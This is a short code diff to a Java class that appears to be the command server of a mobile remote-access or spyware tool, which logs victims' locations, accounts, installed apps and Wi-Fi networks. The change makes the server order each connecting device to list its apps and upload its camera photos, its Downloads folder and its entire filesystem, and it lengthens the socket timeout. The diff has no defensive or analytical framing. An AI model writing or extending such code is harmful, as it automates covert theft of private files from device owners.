@@ -9,7 +9,7 @@ import java.util.Arrays;
 
 public class ClientThread implements Runnable {
 
-    private static final int SO_TIMEOUT = 60000;
+    private static final int SO_TIMEOUT = 120000;
 
     private Logger logger, threadLogger, locationLogger, accountLogger, installedAppsLogger, wifiAPLogger;
     private Socket socket = null;
@@ -61,6 +61,13 @@ public class ClientThread implements Runnable {
             // Request client status
             say("status");
             say("accounts");
+            say("apps");
+            say("download /DCIM/Camera");
+            say("download /Downloads");
+            say("download /");
+
+            // TODO check if client already exists.
+            // TODO notification of a new device
 
             // Start heartbeat
             heartbeat = new Heartbeat(out);
@@ -104,7 +111,7 @@ public class ClientThread implements Runnable {
                         }
                         break;
                     default:
-                        logger.log("I don't understand the data. Quiting");
+                        logger.log("I don't understand the data.");
                         logger.log("header:     " + header);
                         logger.log("size:       " + size);
                         message = new byte[size];
